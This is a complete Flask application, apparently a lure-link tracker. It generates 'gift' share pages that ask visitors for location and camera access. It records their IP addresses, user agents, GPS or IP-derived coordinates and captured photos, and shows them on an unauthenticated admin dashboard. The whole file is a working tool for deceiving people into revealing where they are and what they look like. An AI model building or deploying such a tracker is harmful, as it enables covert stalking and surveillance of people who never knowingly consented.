import os, json, math, ipaddress, requests
from uuid import uuid4
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory

APP_NAME   = "Geo Monitor (Admin)"
PORT       = int(os.environ.get("PORT", "5055"))
DATA_FILE  = os.environ.get("DATA_FILE", "store.json")
UPLOAD_DIR = os.environ.get("UPLOAD_DIR", "uploads")

app = Flask(__name__)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ===== STORAGE (tanpa DB) =====
STORE = {"channels": {}}  # { token: {created_at, hits: [ {...} ] } }

def now_iso():
    return datetime.utcnow().isoformat(timespec="seconds") + "Z"

def load_store():
    global STORE
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                STORE = json.load(f)
        except Exception:
            STORE = {"channels": {}}

def save_store():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(STORE, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

load_store()

def ensure_channel(token: str):
    if token not in STORE["channels"]:
        STORE["channels"][token] = {"created_at": now_iso(), "hits": []}

# ===== Helpers =====
def get_client_ip(req):
    for h in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "X-Client-IP", "Fastly-Client-IP"]:
        v = req.headers.get(h)
        if v:
            return v.split(",")[0].strip()
    return req.remote_addr

def is_private_ip(ip: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip in ("127.0.0.1", "::1")
    except Exception:
        return True

def lookup_ip_location(ip: str):
    # 1) ipapi.co
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=4)
        if r.ok:
            j = r.json()
            lat, lon = j.get("latitude"), j.get("longitude")
            if lat and lon:
                city, region, country = j.get("city"), j.get("region"), j.get("country_name")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipapi.co",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    # 2) ipinfo.io
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
        if r.ok:
            j = r.json()
            loc = j.get("loc")
            if loc:
                lat, lon = loc.split(",", 1)
                city, region, country = j.get("city"), j.get("region"), j.get("country")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipinfo.io",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    return None

# ===== Routes =====
@app.route("/")
def home():
    return redirect(url_for("admin_home"))

# Admin home: buat channel + daftar
@app.route("/admin", methods=["GET", "POST"])
def admin_home():
    if request.method == "POST":
        slug = (request.form.get("slug") or "").strip()
        token = slug if slug else uuid4().hex[:8]
        ensure_channel(token)
        save_store()
        return redirect(url_for("admin_channel", token=token))
    base = request.host_url.rstrip("/")
    channels = STORE["channels"]
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=channels)

# Admin view: channel fokus
@app.route("/admin/<token>")
def admin_channel(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=STORE["channels"], focus=token)

# Halaman share (hadiah) — minta izin lokasi & kamera
@app.route("/t/<token>")
def share_page(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("share.html", app_name=APP_NAME, token=token, base=base)

# API: terima lokasi (GPS; fallback IP). SELALU buat 1 hit & kembalikan id.
@app.route("/api/track/<token>", methods=["POST"])
def api_track(token):
    ensure_channel(token)
    ip = get_client_ip(request)
    ua = request.headers.get("User-Agent", "")
    body = request.get_json(silent=True) or {}

    lat = body.get("lat")
    lon = body.get("lon")
    acc = body.get("acc")
    src = "gps" if lat is not None and lon is not None else None

    ip_meta = None
    if (lat is None or lon is None) and not is_private_ip(ip):
        meta = lookup_ip_location(ip)
        if meta:
            lat, lon, acc = meta["lat"], meta["lon"], meta["acc"]
            ip_meta = meta
            src = meta["source"]

    hit_id = uuid4().hex[:8]
    item = {
        "id": hit_id,
        "ts": now_iso(),
        "ip": ip,
        "ua": ua,
        "coords": {
            "lat": float(lat) if lat is not None else None,
            "lon": float(lon) if lon is not None else None,
            "acc": acc,
            "source": src or "none"
        },
        "ip_label": ip_meta["label"] if ip_meta and ip_meta.get("label") else None,
        "photo_url": None
    }
    STORE["channels"][token]["hits"].append(item)
    STORE["channels"][token]["hits"] = STORE["channels"][token]["hits"][-1000:]
    save_store()
    return jsonify({"ok": True, "id": hit_id})

# API: upload foto dan attach ke hit
@app.route("/api/photo/<token>/<hit_id>", methods=["POST"])
def api_photo(token, hit_id):
    ensure_channel(token)
    if "photo" not in request.files:
        return jsonify({"ok": False, "error": "no_file"}), 400
    f = request.files["photo"]
    # simpan sebagai jpg dengan nama aman
    fname = f"{token}_{hit_id}_{uuid4().hex[:6]}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    f.save(path)

    # set url ke hit
    hits = STORE["channels"][token]["hits"]
    for h in reversed(hits):
        if h["id"] == hit_id:
            h["photo_url"] = f"/uploads/{fname}"
            break
    save_store()
    return jsonify({"ok": True, "photo_url": f"/uploads/{fname}"}), 200

# API: ambil data lokasi (polling)
@app.route("/api/locations/<token>")
def api_locations(token):
    ensure_channel(token)
    since = request.args.get("since")  # ISO
    hits = STORE["channels"][token]["hits"]
    if since:
        newer = [h for h in hits if h["ts"] > since]
        return jsonify({"ok": True, "hits": newer})
    return jsonify({"ok": True, "hits": hits})

# Hapus data 1 channel
@app.route("/api/clear/<token>", methods=["POST"])
def api_clear(token):
    ensure_channel(token)
    STORE["channels"][token]["hits"] = []
    save_store()
    return jsonify({"ok": True})

# Serve file upload
@app.route("/uploads/<path:filename>")
def serve_uploads(filename):
    return send_from_directory(UPLOAD_DIR, filename)

# Health
@app.route("/healthz")
def health():
    return "ok", 200

if __name__ == "__main__":
    # Lokal: http://127.0.0.1:5055
    app.run(host="127.0.0.1", port=PORT, debug=True)
